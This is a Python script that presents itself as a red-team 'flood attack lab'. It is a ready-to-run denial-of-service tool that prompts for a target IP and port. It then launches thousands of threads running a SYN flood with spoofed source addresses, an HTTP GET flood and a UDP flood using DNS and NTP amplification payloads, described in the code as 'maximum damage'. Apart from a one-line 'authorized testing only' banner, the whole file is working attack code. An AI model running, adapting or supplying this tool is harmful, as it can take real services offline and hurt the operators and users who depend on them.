#!/usr/bin/env python3
import random
import socket
import sys
import threading
import time
import os

class UltimateFloodAttack:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.threads = 5000
        self.duration = 0
        self.packets_sent = 0
        self.running = False
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def show_banner(self):
        self.clear_screen()
        print(r"""
  ____            _      _____ _                 
 |  _ \ ___  _ __| |_   |  ___| | ___  ___   ___
 | |_) / _ \| '__| __|  | |_  | |/ _ \/ __| / __|
 | |-/ |(_) | |  | |_   |  _| | | (_) \__ \ \__ \
 |_|   \___/|_|   \__|  |_|   |_|\___/|___/ |___/
        """)
        print("=== ULTIMATE FLOOD ATTACK LAB - RED TEAM ===")
        print("=== WARNING: FOR AUTHORIZED TESTING ONLY ===\n")
        
    def get_user_input(self):
        self.show_banner()
        
        # Target IP
        while True:
            self.target_ip = input("Target IP to attack: ").strip()
            try:
                socket.inet_aton(self.target_ip)
                break
            except:
                print("Invalid IP address")
                
        # Target Port
        while True:
            port = input("Target port (1-65535): ").strip()
            if port.isdigit() and 1 <= int(port) <= 65535:
                self.target_port = int(port)
                break
            print("Invalid port")
            
        # Threads
        threads = input(f"Threads [Default: {self.threads}]: ").strip()
        if threads.isdigit() and int(threads) > 0:
            self.threads = min(int(threads), 10000)
            
        # Duration
        duration = input("Duration in seconds (0=unlimited) [Default: 0]: ").strip()
        if duration.isdigit() and int(duration) >= 0:
            self.duration = int(duration)
            
        # Final confirmation
        self.show_banner()
        print(f"[!] CONFIRM ATTACK ON {self.target_ip}:{self.target_port} [!]")
        print(f"Threads: {self.threads:,}")
        print(f"Duration: {'Unlimited' if self.duration == 0 else f'{self.duration} seconds'}")
        
        if input("\nType 'CONFIRM' to launch: ").strip().upper() != 'CONFIRM':
            print("Attack cancelled")
            sys.exit(0)
            
    def syn_flood(self):
        """High-volume SYN flood"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Random source IP
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # Craft packet
                packet = (
                    # IP Header
                    bytes([0x45, 0x00]) +                   # Version/IHL, ToS
                    (40).to_bytes(2, 'big') +               # Total Length
                    random.randint(1,65535).to_bytes(2,'big') + # Identification
                    (0x4000).to_bytes(2, 'big') +           # Flags/Fragment
                    (255).to_bytes(1, 'big') +              # TTL
                    (6).to_bytes(1, 'big') +                # Protocol (TCP)
                    (0).to_bytes(2, 'big') +                # Header checksum
                    socket.inet_aton(src_ip) +              # Source IP
                    socket.inet_aton(self.target_ip) +      # Destination IP
                    
                    # TCP Header
                    random.randint(1024,65535).to_bytes(2,'big') + # Source port
                    self.target_port.to_bytes(2,'big') +    # Destination port
                    random.randint(0,4294967295).to_bytes(4,'big') + # Sequence
                    (0).to_bytes(4, 'big') +                # Ack number
                    (0x5002).to_bytes(2, 'big') +           # Header length + SYN
                    (5840).to_bytes(2, 'big') +             # Window size
                    (0).to_bytes(2, 'big') +                # Checksum
                    (0).to_bytes(2, 'big')                  # Urgent pointer
                )
                
                s.sendto(packet, (self.target_ip, self.target_port))
                self.packets_sent += 1
                s.close()
            except:
                pass
                
    def http_flood(self):
        """HTTP GET flood"""
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept: text/html,application/xhtml+xml",
            "Connection: keep-alive"
        ]
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                
                # Send multiple requests per connection
                for _ in range(100):
                    request = (
                        f"GET /?{random.randint(0,100000)} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"{random.choice(headers)}\r\n\r\n"
                    )
                    s.send(request.encode())
                    self.packets_sent += 1
                s.close()
            except:
                pass
                
    def udp_amplification(self):
        """UDP amplification attack"""
        # Common amplification payloads
        payloads = [
            # DNS query
            bytes.fromhex("AAAA01000001000000000000") + b"\x07example\x03com\x00\x00\x01\x00\x01",
            # NTP monlist
            bytes.fromhex("1b00" + "00"*468)
        ]
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random.choice(payloads), (self.target_ip, self.target_port))
                self.packets_sent += 1
                s.close()
            except:
                pass
                
    def start_attack(self):
        self.running = True
        threads = []
        
        # Start multiple attack methods simultaneously for maximum damage
        attack_methods = [self.syn_flood, self.http_flood, self.udp_amplification]
        
        print(f"\n[!] Launching attack on {self.target_ip}:{self.target_port}")
        print(f"[!] Using {self.threads:,} threads")
        
        # Create and start threads
        for method in attack_methods:
            for _ in range(self.threads // len(attack_methods)):
                t = threading.Thread(target=method)
                t.daemon = True
                threads.append(t)
                t.start()
                
        # Monitor attack
        try:
            start_time = time.time()
            while self.running:
                elapsed = time.time() - start_time
                print(f"\r[+] Attacking: {elapsed:.1f}s | Packets: {self.packets_sent:,}", end="")
                
                # Stop if duration reached
                if self.duration > 0 and elapsed >= self.duration:
                    self.stop()
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            self.stop()
            
        print("\n[!] Attack completed")
        
    def stop(self):
        self.running = False

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Error: This script requires root privileges")
        sys.exit(1)
        
    attack = UltimateFloodAttack()
    attack.get_user_input()
    attack.start_attack()